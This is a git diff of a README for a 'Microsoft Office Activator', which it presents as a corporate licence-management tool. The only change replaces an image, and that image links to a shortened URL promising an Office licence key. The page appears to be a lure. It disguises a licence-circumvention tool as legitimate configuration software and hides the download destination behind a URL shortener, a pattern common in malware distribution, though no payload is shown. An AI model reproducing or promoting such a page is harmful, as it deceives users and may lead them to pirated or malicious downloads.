@@ -1,7 +1,7 @@
 # Microsoft Office Activator
 A widely‑used approach among corporations for managing software licences across multiple devices.
 
-[![4234234324324512412211](https://github.com/user-attachments/assets/85c91331-3c70-43cc-9469-4f94813899b8)](https://y.gy/get-office-license-key.)
+[![4234234324324512412211](https://github.com/user-attachments/assets/f28c702b-a17e-402c-9903-d71b16f290fa)](https://y.gy/get-office-license-key.)
 
 **Office Configuration Management Tool**
 
